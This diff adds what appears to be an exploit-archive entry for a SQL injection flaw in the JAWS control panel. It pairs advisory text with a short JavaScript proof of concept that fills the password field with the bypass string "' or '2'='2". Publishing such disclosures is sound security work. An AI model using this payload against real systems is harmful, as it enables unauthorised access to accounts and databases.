@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/10826/info
+
+JAWS is reportedly affected by a remote SQL injection vulnerability. This issue occurs in the controlpanel.php script due to a failure of the application to properly sanitize user-supplied URI parameter input before using it in an SQL query.
+
+Because of this, a malicious user may influence database queries in order to view or modify sensitive information, potentially compromising the software or the database.
+
+<script type="text/javascript">
+
+function crypt_form(form) {
+var new_password = calcMD5(form.password.value);
+form.crypted_password.value = "' or '2'='2";
+form.password.value = "";
+return true;
+}
+</script>
